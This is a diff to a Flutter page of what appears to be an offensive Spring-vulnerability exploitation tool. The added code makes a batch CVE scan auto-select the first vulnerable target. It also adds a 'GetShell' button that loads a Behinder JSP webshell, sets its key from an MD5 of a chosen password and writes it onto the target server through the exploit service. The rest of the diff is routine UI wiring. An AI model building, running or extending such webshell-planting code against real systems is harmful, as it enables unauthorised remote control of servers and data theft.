@@ -1,4 +1,8 @@
+import 'dart:convert';
+
+import 'package:crypto/crypto.dart';
 import 'package:flutter/material.dart';
+import 'package:flutter/services.dart' show rootBundle;
 
 import '../../app/constants.dart';
 import '../../exp/vulhub/spring_exp_service.dart';
@@ -26,6 +30,7 @@ class _SpringPageState extends BaseVulhubExpPageState<SpringExpPage> {
   final _urlCtrl = TextEditingController();
   final _cmdCtrl = TextEditingController(text: 'id');
   final _timeoutCtrl = TextEditingController();
+  final _passwordCtrl = TextEditingController(text: AppConstants.defaultShellPassword);
 
   SpringVulnType _selected = SpringVulnType.springCloudFunction;
 
@@ -56,10 +61,18 @@ class _SpringPageState extends BaseVulhubExpPageState<SpringExpPage> {
     appendLog('[*] 批量检测所有 Spring CVE...');
     try {
       final svc = _svc();
+      SpringVulnType? firstHit;
       for (final t in SpringVulnType.values) {
         appendLog('[*] 检测 ${t.label}...');
         final r = await svc.checkSingle(t);
         appendLog(r.vulnerable ? '[+] ${r.vulnName}: ${r.detail}' : '[-] ${r.vulnName}');
+        if (r.vulnerable && firstHit == null) {
+          firstHit = t;
+        }
+      }
+      if (firstHit != null && mounted) {
+        setState(() => _selected = firstHit!);
+        appendLog('[*] 已自动选择首个命中漏洞: ${firstHit.label}');
       }
     } catch (e) {
       appendLog('[!] 异常: $e');
@@ -88,11 +101,44 @@ class _SpringPageState extends BaseVulhubExpPageState<SpringExpPage> {
     }
   }
 
+  Future<void> _getShell() async {
+    final url = _urlCtrl.text.trim();
+    if (url.isEmpty) { appendLog('[!] 请输入目标 URL'); return; }
+    setState(() => running = true);
+    appendLog('[*] GetShell (${_selected.label})...');
+    try {
+      final password = _passwordCtrl.text.trim().isEmpty
+          ? AppConstants.defaultShellPassword
+          : _passwordCtrl.text.trim();
+      var shellContent = await rootBundle.loadString('assets/defaults/payloads/jsp_behinder.jsp');
+      final key = md5.convert(utf8.encode(password)).toString().substring(0, 16);
+      shellContent = shellContent.replaceFirst(
+        RegExp(r'String k="[0-9a-f]{16}"'),
+        'String k="$key"',
+      );
+      final shellUrl = await _svc().getShell(
+        _selected,
+        shellContent,
+        onLog: appendLog,
+      );
+      if (shellUrl != null) {
+        appendLog('[+] GetShell 成功: $shellUrl');
+      } else {
+        appendLog('[-] GetShell 失败：未发现可访问的 shell 文件');
+      }
+    } catch (e) {
+      appendLog('[!] 异常: $e');
+    } finally {
+      if (mounted) setState(() => running = false);
+    }
+  }
+
   @override
   void dispose() {
     _urlCtrl.dispose();
     _cmdCtrl.dispose();
     _timeoutCtrl.dispose();
+    _passwordCtrl.dispose();
     super.dispose();
   }
 
@@ -133,6 +179,11 @@ class _SpringPageState extends BaseVulhubExpPageState<SpringExpPage> {
         vTf(_cmdCtrl, '命令', 'id'),
         const SizedBox(height: 8),
         vBtn('执行命令', running ? null : _execRce),
+        const SizedBox(height: 16),
+        vSecTitle('GetShell'),
+        vTf(_passwordCtrl, '冰蝎密码', AppConstants.defaultShellPassword),
+        const SizedBox(height: 8),
+        vBtn('GetShell (写入 JSP)', running ? null : _getShell),
       ]),
     );
   }
